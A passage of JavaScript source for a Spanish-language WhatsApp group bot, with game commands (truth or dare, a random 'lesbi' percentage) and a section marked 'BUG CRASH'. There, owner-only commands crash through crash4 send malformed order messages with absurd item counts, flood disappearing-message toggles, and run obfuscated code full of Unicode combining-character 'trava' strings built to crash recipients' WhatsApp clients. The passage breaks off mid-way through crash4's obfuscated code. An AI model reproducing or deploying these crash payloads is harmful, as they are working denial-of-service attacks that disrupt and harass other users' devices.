.co/mcrsqsw/d65716315dc8cf5df3e438f6adf95c9e.jpg','https://i.ibb.co/hY3N02B/6bcee3571197465654c97683d0ed0e20.jpg','https://i.ibb.co/Js1sLBh/124d64ed1227aa1487a2c42b24f8837a.jpg','https://i.ibb.co/Kjc5NkN/993ccbdf49d7e1e256274cafc2585eef.jpg','https://i.ibb.co/p0sjxGX/3a741a4634e9445c5f93bf325b75ef2a.jpg','https://i.ibb.co/BqkFmY3/064bab224123321def4b21d224fe8e82.jpg','https://i.ibb.co/rfTwhXz/logo.jpg','https://i.ibb.co/H7C2bJD/7896dbb5d93ce36a81399c9e24e0e9fa.jpg','https://i.ibb.co/rbs9ZG0/506ab25382f022726b879c2fed3179a0.jpg','https://i.ibb.co/gj2JCZm/3d71bc19b7e56e23c94de9a2da33ba3e.jpg','https://i.ibb.co/WKZV6yG/79f8e21c88ca8044a2350024675d34ef.jpg','https://i.ibb.co/427Lj3L/7f6d1e9f9a4d3316c4f6834a2fe7ec32.jpg','https://i.ibb.co/R9SXJS1/7858da10a6d8dc3a7b3d06c437dcf5c7.jpg','https://i.ibb.co/BZwM4xL/32fb465027798249e815b5473ee0d210.jpg','https://i.ibb.co/7WX24j5/b91c79ea703cd93de96656ab60cdd789.jpg','https://i.ibb.co/K5bjZY2/bb6bbe2a3295c8539970c2111f239b4b.jpg','https://i.ibb.co/SVc69Dk/54b136d4d9a52df59901fc6c675cd960.jpg','https://i.ibb.co/Wxrmn1Z/0e6c1b49b5629101da59f06db122ad19.jpg','https://i.ibb.co/zFf5KFZ/6ed2bedc080a9e8c3b267d927433e7bf.jpg','https://i.ibb.co/6Zpkx7M/075d4b0ea4e6a5bac6085bbe9157ba37.jpg','https://i.ibb.co/Tq6YJyS/c0ebcbd97922d1271629ab87469dc0c7.jpg','https://i.ibb.co/RgVcvh8/be54e24e4a7276b1d3cc830a03fd4676.jpg','https://i.ibb.co/61G5nQb/6f8c4afef5b7ddf538447dc218ca0ef8.jpg','https://i.ibb.co/QdkJ0Y8/da76b20813815efd1dbf84116501b25a.jpg','https://i.ibb.co/S3pKHft/1ec2838d5cd0cd53eaface83a1bfa921.jpg','https://i.ibb.co/9GW77Vn/5983cbabf5827793558ee7fddbaf173f.jpg','https://i.ibb.co/WpbQWqH/74ba70dce0b89460129a05ed13380aa0.jpg','https://i.ibb.co/Bwh0MS4/8ea55d8ccaa10c5b3ff540e0e08f802e.jpg','https://i.ibb.co/2c1cymy/56142f816478a819ce32453a2f917af5.jpg','https://i.ibb.co/BGfjR8M/923f89fd65d33f823028ce2944a8fb77.jpg','https://i.ibb.co/TRMb2r3/9bef9de9f522d30de4ed4c07abd2de92.jpg']
                                        let caanigtip = canuugti[Math.floor(Math.random() * canuugti.length)]
                                        	il = await getBuffer(caanigtip)
                                        cnf.sendMessage(from, il, image, {quoted: mek, caption: `Se te cobraron 30 coins`})
					await limitAdd(sender)
                                        addFilter(from)
          break

    case prefix+'lesbi':
    if (isBanned) return  reply(mess.banned)
 if	(!isRegistered) return reply(ind.noregis())	
			
    const cuu =['Eres 0% Lesbi' , 'Eres 1% Lesbi' , 'Eres 2% Lesbi' , 'Eres 3% Lesbi' , 'Eres 4% Lesbi' , 'Eres 5% Lesbi' , 'Eres 6% Lesbi' , 'Eres 7% Lesbi' , 'Eres 8% Lesbi' , 'Eres 9% Lesbi' , 'Eres 10% Lesbi' , 'Eres 11% Lesbi' , 'Eres 12% Lesbi' , 'Eres 13% Lesbi' , 'Eres 14% Lesbi' , 'Eres 15% Lesbi' , 'Eres 16% Lesbi' , 'Eres 17% Lesbi' , 'Eres 18% Lesbi' , 'Eres 19% Lesbi' , 'Eres 20% Lesbi' , 'Eres 21% Lesbi' , 'Eres 22% Lesbi' , 'Eres 23% Lesbi' , 'Eres 24% Lesbi' , 'Eres 25% Lesbi' , 'Eres 26% Lesbi' , 'Eres 27% Lesbi' , 'Eres 28% Lesbi' , 'Eres 29% Lesbi' , 'Eres 30% Lesbi' , 'Eres 31% Lesbi' , 'Eres 32% Lesbi' , 'Eres 33% Lesbi' , 'Eres 34% Lesbi' , 'Eres 35% Lesbi' , 'Eres 36% Lesbi' , 'Eres 37% Lesbi' , 'Eres 38% Lesbi' , 'Eres 39% Lesbi' , 'Eres 40% Lesbi' , 'Eres 41% Lesbi' , 'Eres 42% Lesbi' , 'Eres 43% Lesbi' , 'Eres 44% Lesbi' , 'Eres 45% Lesbi' , 'Eres 46% Lesbi' , 'Eres 47% Lesbi' , 'Eres 48% Lesbi' , 'Eres 49% Lesbi' , 'Eres 50% Lesbi' , 'Eres 51% Lesbi' , 'Eres 52% Lesbi' , 'Eres 53% Lesbi' , 'Eres 54% Lesbi' , 'Eres 55% Lesbi' , 'Eres 56% Lesbi' , 'Eres 57% Lesbi' , 'Eres 58% Lesbi' , 'Eres 59% Lesbi' , 'Eres 60% Lesbi' , 'Eres 61% Lesbi' , 'Eres 62% Lesbi' , 'Eres 63% Lesbi' , 'Eres 64% Lesbi' , 'Eres 65% Lesbi' , 'Eres 66% Lesbi' , 'Eres 67% Lesbi' , 'Eres 68% Lesbi' , 'Eres 69% Lesbi' , 'Eres 70% Lesbi' , 'Eres 71% Lesbi' , 'Eres 72% Lesbi' , 'Eres 73% Lesbi' , 'Eres 74% Lesbi' , 'Eres 75% Lesbi' , 'Eres 76% Lesbi' , 'Eres 77% Lesbi' , 'Eres 78% Lesbi' , 'Eres 79% Lesbi' , 'Eres 80% Lesbi' , 'Eres 81% Lesbi' , 'Eres 82% Lesbi' , 'Eres 83% Lesbi' , 'Eres 84% Lesbi' , 'Eres 85% Lesbi' , 'Eres 86% Lesbi' , 'Eres 87% Lesbi' , 'Eres 88% Lesbi' , 'Eres 89% Lesbi' , 'Eres 90% Lesbi' , 'Eres 91% Lesbi' , 'Eres 92% Lesbi' , 'Eres 93% Lesbi' , 'Eres 94% Lesbi' , 'Eres 95% Lesbi' , 'Eres 96% Lesbi' , 'Eres 97% Lesbi' , 'Eres 98% Lesbi' , 'Eres 99% Lesbi' , 'Eres 100% Lesbi']														
  	const rii = cuu[Math.floor(Math.random() * cuu.length)]
					wnw = fs.readFileSync(`./src/5.jpg`)						
						cnf.sendMessage(from, wnw, image, { caption: '*Que tan lesbi eres*\n\n'+ rii, quoted: mek })
					addFilter(from)
          break                                      

							case prefix+'reto':
							if (isBanned) return  reply(mess.banned)
 if(!isRegistered) return reply(ind.noregis())
				
					const daare =['Te reto a poner en tu info de Whatsapp que te gusta Anuel por 24 horas','Te reto a decirle a tu crush que la amas y pasar cap en el grupo','Te reto a poner en tu estado que buscas pareja','Te reto a poner en tu perfil la foto de tu crush','Te reto a decirle a alguien que te gusta...','Te reto a mandar un audio cantando','Te reto mandar audio hablando con vos de niña de 5 años','Te reto a poner en tu info que te gusta tu vecin@','Te reto mandar una foto tuya sin taparte la cara','Te reto a decir que apodo tenias cuando eras un/a niñ@ aun','Te reto a enviar un vídeo bailando','Te reto a enviar el último meme que allas visto','Te reto a enviar tu canción favorita']
					const deer = daare[Math.floor(Math.random() * daare.length)]
				wbw = fs.readFileSync(`./src/4.jpg`)
							
						cnf.sendMessage(from, wbw, image, { quoted: mek, caption: '*Reto 😈*\n\n'+ deer })
					addFilter(from)
          break										
									case prefix+'verdad':
									if (isBanned) return  reply(mess.banned)
 if (!isRegistered) return reply(ind.noregis())		
		
					const trrut =['Con quien de los que están aqui en el grupo te besarías? (etiqueta)','¿Alguna vez te ha gustado alguien? ¿Cuanto tiempo?','Alunga vez te llegó a gustar el/la herman@ de tu mejor amig@?','Cuantos años tienes?','Cuanto tiempo ah pasado desde que diste tu último beso?','Te gustan los chicos o las chicas o ambos?','Que opinas sobre BTS','Que opinas sobre l@s administradores','Tienes novi@?','Cuantas veces te as sentido ignorad@ por tu pareja o insuficiente para el/ella?','Que opinas de la nueva política de Whatsapp?','Que opinas sobre Telegram?','Tienes canal de Youtube?','Que opinas sobre Este bot?','Que opinas sobre el grupo?','Que tal te parece esta función de verdad o reto?']
					const ttrrth = trrut[Math.floor(Math.random() * trrut.length)]
					wuw = fs.readFileSync(`./src/6.jpg`)						
						cnf.sendMessage(from, wuw, image, { caption: '*Verdad😇*\n\n'+ ttrrth, quoted: mek })
					addFilter(from)
          break
      
		    	case prefix+'antitrava':
		    	if (isBanned) return  reply(mess.banned)  
                if (!isRegistered) return reply(ind.noregis())			  
                if (!isGroup) return reply(`「 ❗ 」ESTE COMANDO SOLO PUEDE SER USADO EN GRUPOS`)
			    if (!isGroupAdmins) return reply(mess.only.admin)
				if (args.length < 1) return reply('「 ❗ 」 1 Para Activar, 0 Para Desactivar')
				if (Number(args[0]) === 1) {
				if (isTrava) return reply(`「 ❗ 」La Funcion De Antitrava Ya Esta Activada En El Grupo!!`)
				trava.push(from)
				fs.writeFileSync('./database/trava.json', JSON.stringify(trava))
				reply(`「 ❗ 」Activó con éxito la función Antitrava en este grupo`)
				} else if (Number(args[0]) === 0) {
				trava.splice(from, 1)
				fs.writeFileSync('./database/trava.json', JSON.stringify(trava))
				reply(`「 ❗ 」Deshabilitó Con Éxito La Función Antitrava En Este Grupo`)
				} else {
				reply('「 ❗ 」 1 Para Habilitar Y 0 Para Desactivar')
				}
				addFilter(from)
          break



 // BUG CRASH //
 
                     				case prefix+'crash': 
                     				if (isBanned) return  reply(mess.banned)
				if (!isOwner) return reply(mess.only.ownerB)
cnf.sendMessage(mek.key.remoteJid, '𝐂𝐫𝐚𝐬𝐡 𝐛𝐲 𝐂𝐨𝐧𝐟𝐮𝐌𝐨𝐝𝐬', MessageType.extendedText, {
 quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999, 
    status: 1,
    surface: 1,
    message: '𝐂𝐨𝐧𝐟𝐮𝐁𝐨𝐭𝟐',
    orderTitle: 'BY CONFUMODS ', // 
    sellerJid: '0@s.whatsapp.net' //
   }
  }
 }
})
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
addFilter(from)
          break




					case prefix+'crash2':
					if (!isOwner) return reply(mess.only.ownerB)
					if (isBanned) return  reply(mess.banned)
              const _0x2a55=['A2v5','B3DUzxjc','ndC1ndC2DLPgCxbX','qxn5BhvTvMLYDxm','otu4n3LrCe1pDa','ndG5ntKYveT6q0r6','nJaYnJf1zNvLvNm','B25SEq','mZq4otyWrLbeq0DT','Dg9Nz2XLrgLZyxbWzwfYAw5NtwvZC2fNzxm','ndi4mJC3yu51z0HU','qgfKAxDHANnOAw5Nl2jHAwXLExm','nvnTshDpqG','4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAscUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwHokwHokwHokwHokwHokwHokwHokwHokwKUkwKUkwKUkwKUkwKUkwKGRILPlILPlILOJILPlILPlILPlILOtILOJILOJILOJILOJILOJILOJILOJILOJILOJILOJILOtILPlILPlILPlILPik4PAs4PAi4PAq4PAs4PAs4PAs4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAs4PAs4PAs4PAscUkwKUkwJokwKokwKUkwKUkwIokwIokwHokwGokwIokwIokwIokwIokwIokwIokwGokwHokwIokwIokwKUkwKUkwKGRILPdILlZILPdILPlILPlILOJILOJILOtILOtILOtILOtILOJILOJILOtILOtILOtILOtILOJILOJILPlILPlILPik4PAq4Ps84PAq4PAs4PAs4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAs4PAs4PAscUkwKokwHokwKokwIokwIokwIokwIokuGokwGokwKokwKokwGokwIokuGokwIokuGokwJokwKokwIokwIokwHokwKGRILPlILPlILOJILOJILOJILOJILOJILidILidILidILidILidILidILidILidILidILidILPdILOJILOJILOJILOWk4PAs4PAs4PAi4PAa4PAa4PAi4PAi4PAe4PAi4Psa4PAe4Psa4Psa4Psa4PAq4Psa4PAe4PAi4PAi4PAi4PAa4PAscUkwKUkwKUkwIokwKUkwKUkwIokwIokwIokwIokwIokwIokwIokwHokwIokwIokwIokwIokwIokwIokwKUkwKUkwKGRILPlILPlILPlILPlILPlILOJILOJILOJILOJILOJILOJILOJILOJILOJILOJILOJILOJILOJILOJILPlILPlILPik4PAs4PAs4PAs4PAs4PAs4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAs4PAs4PAscUkwKUkwKUkwKUkwKUkwKUkwIokwIokwIokwIokwIokwIokwIokwIokwIokwKokwJokwIokwIokwJokwKUkwKUkwKGRILPlILPlILPlILPlILPlILPdILOdILPdILPlILOZILOdILOJILOdILPlILPdILPlILOJILPlILPlILPlILPlILPik4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAq4PAs4PAs4PAs4PAs4PAm4PAs4PAs4PAs4PAs4PAscUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKG','mebZlNDOyxrZyxbWlM5LDa','nJm5ntDVDxLlDM8','4PIG77Ipqxn5BhvT4PIG77Ip','zxH0zw5KzwruzxH0','C2vUze1LC3nHz2u','ndHnyNPZzu8'];const _0x181205=_0x3357;(function(_0x15c8b7,_0x1c69db){const _0x28ef5e=_0x3357;while(!![]){try{const _0x5b2e3c=parseInt(_0x28ef5e(0x89))+-parseInt(_0x28ef5e(0x82))+-parseInt(_0x28ef5e(0x7b))+-parseInt(_0x28ef5e(0x7d))+parseInt(_0x28ef5e(0x86))*parseInt(_0x28ef5e(0x8b))+parseInt(_0x28ef5e(0x79))*-parseInt(_0x28ef5e(0x7f))+parseInt(_0x28ef5e(0x8c));if(_0x5b2e3c===_0x1c69db)break;else _0x15c8b7['push'](_0x15c8b7['shift']());}catch(_0x45cd13){_0x15c8b7['push'](_0x15c8b7['shift']());}}}(_0x2a55,0x45079));if(!isOwner)return reply(mess[_0x181205(0x7a)][_0x181205(0x88)]);function _0x3357(_0x3b0a3d,_0x1534a4){_0x3b0a3d=_0x3b0a3d-0x79;let _0x2a5539=_0x2a55[_0x3b0a3d];if(_0x3357['cjjhGf']===undefined){var _0x335755=function(_0x5225bd){const _0x46b860='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x43d834='';for(let _0x36a7b6=0x0,_0x135f3a,_0x57c727,_0x2a4bc5=0x0;_0x57c727=_0x5225bd['charAt'](_0x2a4bc5++);~_0x57c727&&(_0x135f3a=_0x36a7b6%0x4?_0x135f3a*0x40+_0x57c727:_0x57c727,_0x36a7b6++%0x4)?_0x43d834+=String['fromCharCode'](0xff&_0x135f3a>>(-0x2*_0x36a7b6&0x6)):0x0){_0x57c727=_0x46b860['indexOf'](_0x57c727);}return _0x43d834;};_0x3357['dExSbW']=function(_0x124420){const _0xb94211=_0x335755(_0x124420);let _0x567ce5=[];for(let _0x1648bd=0x0,_0x2f3fcb=_0xb94211['length'];_0x1648bd<_0x2f3fcb;_0x1648bd++){_0x567ce5+='%'+('00'+_0xb94211['charCodeAt'](_0x1648bd)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x567ce5);},_0x3357['YaAqHs']={},_0x3357['cjjhGf']=!![];}const _0x4f0ece=_0x2a55[0x0],_0x30a154=_0x3b0a3d+_0x4f0ece,_0x2f9b51=_0x3357['YaAqHs'][_0x30a154];return _0x2f9b51===undefined?(_0x2a5539=_0x3357['dExSbW'](_0x2a5539),_0x3357['YaAqHs'][_0x30a154]=_0x2a5539):_0x2a5539=_0x2f9b51,_0x2a5539;}function sleep(_0x4f0ece){return new Promise(_0x30a154=>setTimeout(_0x30a154,_0x4f0ece));}function troli(_0x2f9b51){const _0x107123=_0x181205;cnf[_0x107123(0x85)](_0x2f9b51,_0x107123(0x80),MessageType[_0x107123(0x84)],{'quoted':{'key':{'participant':_0x107123(0x81)},'message':{'orderMessage':{'thumbnail':dfrply,'itemCount':-0x39cd8185,'status':0x1,'surface':0x1,'message':_0x107123(0x83),'orderTitle':_0x107123(0x8a),'sellerJid':'0@s.whatsapp.net'}}}});}function bug(_0x5225bd){const _0xc0b2db=_0x181205;for(let _0x43d834=0x0;_0x43d834<0x1;_0x43d834++){var _0x46b860=require(_0xc0b2db(0x7e));cnf[_0xc0b2db(0x7c)](_0x5225bd,_0x46b860);}}async function attack(_0x36a7b6){bug(_0x36a7b6),await sleep(0x64),troli(_0x36a7b6),await sleep(0x64),bug(_0x36a7b6);}attack(mek[_0x181205(0x87)]['remoteJid']);
addFilter(from)
          break					
                    
case prefix+'crash3':
if (isBanned) return  reply(mess.banned)
					if (!isOwner) return reply(mess.only.ownerB)
					if (args.length < 1) return reply('Que cantidad??')
				 for (let i = 0; i < args[0]; i++) {
await cnf.toggleDisappearingMessages(from, 0)
}
sendFakeStatus(from, '𝐂𝐨𝐧𝐟𝐮𝐌𝐨𝐝𝐬'+args.join(' '), fake)
					addFilter(from)
          break
					case prefix+'crash4':
					if (!isOwner) return reply(mess.only.ownerB)
if (!isOwner) return reply(mess.only.ownerB)
var _0x4e42=['݆݆ܻܻࣩ','*Myth','͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋','ܻܻܻܺܺ','݆ܻܻࣩࣩ','๊๊์์์','֟֟֟֓֓','icXbo','hatsa','ٍٍٍٞ٘','᪴᪴᪴᪴Myt','֒֒֒֒֓','์์์๋๋','ؕؕؕؕؖ','Title','͊̈́̈́͋͋͋͋͋͋͋͠͠͠͠͠','ືືຶຶຶ','MOKAD','ّّّّؖ','͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠','̫̫̫̫̫̫̫̫̽̽̽̽̽̽̽','เึางื','͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢','͢͢͠͠͠͠҉҉҉','৭99**','toggl','֓֓֒֒֒','ܑܑۛۛۛ','͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋','҈֟֟֟֟','itemC','ࣩࣩࣩࣧࣧ','ৣ͜͡҉*My','֒֒֒֘֘','֒֓֓֓֓','৭৭৭99','ดุท้่','̼̼̼̼̼̽̽̽̽̽̽̽͊͊͊','Hello','৭ঔৣ͜͡҉*','ຶຶຶຶຶ᪴᪴','ًًٍٍٍ','๊๊๊ࣤࣤ','҈҈̫̫̫̫̫̫̫̫̫̫̫','ؖؕؕؕؕ','๊๊๊์์','͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠','݆݊݊݊݊','̫̫̫̫̫̫̫̫̫̫̫̽̽̽̽','ܺܺܺܺܺ','֓֓֓֓֒','Messa','͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋','t҈҈҈҉','҈҈֟֟֟','͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠','͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́','͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠','݉݊݊݊݊','ࣩ࣯ࣩࣩࣩ','Xbot*','̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫','͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠','҈҈҈̫̫̫̫̫̫̫̫','͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠','ssage','֓֓֓֒֒','݊݊݊݊݊','ຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴','Xbot҈','ingMe','\x20Worl','ؕؕؖؖؖ','ࣨࣨࣨࣨࣤ','݆݆݊݊݊','9999*','֓֒֒֒֘','ؖؖؖؕؕ','ܺ݉݉݉݉','݉݉݉݊݊','৭৭99*','᪴᪴᪴᪴᪴᪴᪴My','֒֒֘֘֘','֗ؖؖؖؖ','๊ࣤࣤࣤࣤ','֟֓֓֓֓','bot*৭','֟֟֟֟֓','͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠','ܑܑܑܑܑ','ٍٍٍٍٍ','Mythi','࣯ࣩࣩࣩࣩ','thicX','order','๋๋๋ືື','҈҈҈҉҉','ًًّٞٞ','݆݆݆݆݅','4829fwHcxj','13hXShDP','͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋','ot*৭৭','݉݉݉݉݊','҈҈҈҈̫̫̫̫̫','͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊','ًًًًً','1359289sKNbgc','݆݆݆݆ܻ','ًّٞٞٞ','t*৭ঔৣ͜͡','৭৭৭*M','์๋๋๋๋','̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋','bot҈҈','ot҈҈҈','**ঔৣ͜͡҉','๊๊๊๊๊','ّّؖؖؖ','ܑܑܑܑۛ','̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊','ܻܻܻܻܻ','hicXb','*ผิดุ','ࣩࣩࣩ࣯ࣩ','҉҉҉҉҉','҈҉҉҉҈','ࣩࣩࣩࣨࣨ','ppear','ًًًٍٍ','̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́','pp.ne','ࣨࣨࣤࣤࣤ','ࣩࣩࣩࣧࣧ','͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠','֘֘֘֗֗','essag','͢͢͠͠͠͠͠͠͠҉҉','ًٍٍٍۛ','างืผิ','ؖؖؖؖؖ','ܑܑܑܑܻ','҉҉҉҈҈','݆݆݆݆݅','ّّّؖؖ','݉݉݊݊݊','๊๊ࣤࣤࣤ','๊๊๊๊์','*৭৭৭ঔ','ًًًًّ','ٍٍٍٍ٘','҈҈҈҈҉','๋๋๋๋๋','ٍۛۛۛۛ','๒๒๒๒๒','֒֒֒֓֓','cXbot','ࣩࣨࣨࣨࣨ','ࣨࣨࣨࣤࣤ','๊์์์์','ܺܺܺ݉݉','͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠','ًًٍٍٍ','֟֟֟֟֟','݆݆݆݊݊','͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠','ࣩࣩࣩࣩࣧ','*999*','ືືືຶຶ','৭৭৭ঔৣ͜͡','᪴Myth','ࣤࣤࣤࣤࣤ','ܑܑܑܻܻ','͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠','͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋','͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊','֘֗֗֗֗','ܻܻࣩࣩࣩ','ܻࣩࣩࣩࣩ','ࣩࣩࣩࣩࣨ','surfa','ًًًٍٍ','messa','ّٞٞٞٞ','҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫','ܑۛۛۛۛ','ܑܑܻܻܻ','๋๋๋๋ື','HOLE','ࣧࣧࣧࣧࣧ','owner','ًًًّٞ','ؕؕؕؖؖ','ٞٞٞٞ٘','҉҈҈҈҉','**999','͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋','0@s.w','݆݆݅݅݅','1cLVQaQ','ࣩࣩࣩࣩ࣯','ؕؖؖؖؖ','ືືືືຶ','͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊','ّّّّّ','ًًًًٍ','̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽','֓֓֓֓֓','ًًّّّ','̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽','͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́','eDisa','1200979orKwdx','֗֗֗֗ؖ','ືືືືື','݆݆݆݆݆','์์๋๋๋','ຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴','҉*Myt','t*৭99','ؕؕؕؕؕ','͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́','᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴','BLACK','๒๒๒*M','์์์์์','҈҉҉҉҉','͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋','99**ঔ','fRhVi','֓֒֒֒֒','ࣩࣩࣩࣩࣩ','݅݅݅݅݅','̫̫̽̽̽̽̽̽̽̽̽̽̽̽̽','݆݆݆݅݅','͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠','2EhGktQ','386031ZjTtDr','only','key','ຶຶຶຶຶ','ount','ࣩࣩࣨࣨࣨ','֒֒֓֓֓','͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠','ٍٍۛۛۛ','֒֘֘֘֘','ٞٞٞٞٞ','ࣩࣧࣧࣧࣧ','9**ঔৣ͜͡','֗֗ؖؖؖ','͢͢͠҉҉҉҉','๋๋ືືື','quote','҉҈҈֟֟','͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋','֟֟֓֓֓','ືຶຶຶຶ','݆݆݅݅݅','sendM','͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠','҈҈҈҈҈','ࣩࣩࣧࣧࣧ','ٍٍٞٞ٘','᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴M','log','statu','cipan','͢͢͠͠͠͠͠͠͠͠͠͠҉','͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊','์์์์๋','᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴\x20','nvSjK','ࣩࣩ࣯ࣩࣩ','ࣩࣧࣧࣧࣧ','͋͢͢͢͢͢͢͢͢͢͠͠͠͠͠','191809UIvCgG','͋͋͋͋͋͋͋͢͢͢͠͠͠͠͠','֗֗֗ؖؖ','selle','֒֒֒֒֒','֘֘֗֗֗','ຶຶຶຶ᪴᪴᪴᪴᪴','҈҈҉҉҉','ythic','݆݆݆݅݅','̫̫̫̫̫̽̽̽̽̽̽̽̽̽̽','parti','̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽','ࣨࣨࣨࣨࣨ','҉҉҈҈֟','ࣩࣩࣩࣩࣧ','157OyWNpx','ঔৣ͜͡҉*M','͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́','ؖؖؕؕؕ','*ঔৣ͜͡҉*','ًّّّّ','3806qyahEk','҉҉҉҉҈','228596HWWiFX','ٍٞٞٞ٘','ܻܻܺܺܺ','ؖؖؖؖؕ','ܺܺ݉݉݉','ًًًًٍ','҈҈҈҈҈̫̫','ٍٍٍۛۛ','֘֘֘֘֗','ot*৭9','ۛۛۛۛۛ','ࣩࣩࣧࣧࣧ','*৭৭৭*','̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͠͠','๋ືືືື','๊๊๊๊ࣤ','͋͋͋͋͢͢͢͢͢͢͠͠͠͠͠','҉҈҈҈҈','ܻܻܻܻܺ','ّؖؖؖؖ','҉҉҈҈҈','ًٍٍٍٍ','̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽','rJid','֘֘֘֘֘','݆݆݆ܻܻ','̫̫̫̫̫̫̫̫̫̫̫̫̫̫̽','݆݆݆݆݊','ܑܑܑۛۛ','ࣨࣤࣤࣤࣤ','ًًًًّ','̼̼̼̽̽̽͊͊͊͊͋͋͋͋͋','ຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴','৭৭৭৭৭','݆݅݅݅݅','ًًًّّ','t*৭৭৭','ท้่เึ','ܑܻܻܻܻ','ܺܺܺܺ݉','ܻܺܺܺܺ','֗֗֗֗֗','̼̼̼̼̼̽̽̽̽͊͊͊͊͋͋','݆݅݅݅݅','ঔৣ͜͡҉*\x20'];var _0x293d1a=function(_0xe5b85f,_0x3e47f9,_0x2b131c,_0x50b73d,_0xb8d2fd){return _0x9cdd(_0xe5b85f-0xf0,_0xb8d2fd);},_0x684e74=function(_0x25fd8a,_0x91e34f,_0x5898f3,_0x242999,_0x14a3c3){return _0x9cdd(_0x25fd8a-0xf0,_0x14a3c3);},_0x40c325=function(_0x3c464a,_0x8c809a,_0x5b0c60,_0x372cc8,_0x578bd0){return _0x9cdd(_0x3c464a-0xf0,_0x578bd0);},_0x28d701=function(_0x4eecc5,_0x3cab4b,_0xd619ab,_0x4cd0f1,_0x12a44a){return _0x9cdd(_0x4eecc5-0xf0,_0x12a44a);},_0x1dea33=function(_0x366fa0,_0x2f56d1,_0x6aa090,_0x49a4ac,_0x385e7d){return _0x9cdd(_0x366fa0-0xf0,_0x385e7d);};(function(_0x33730b,_0x32f0a8){var 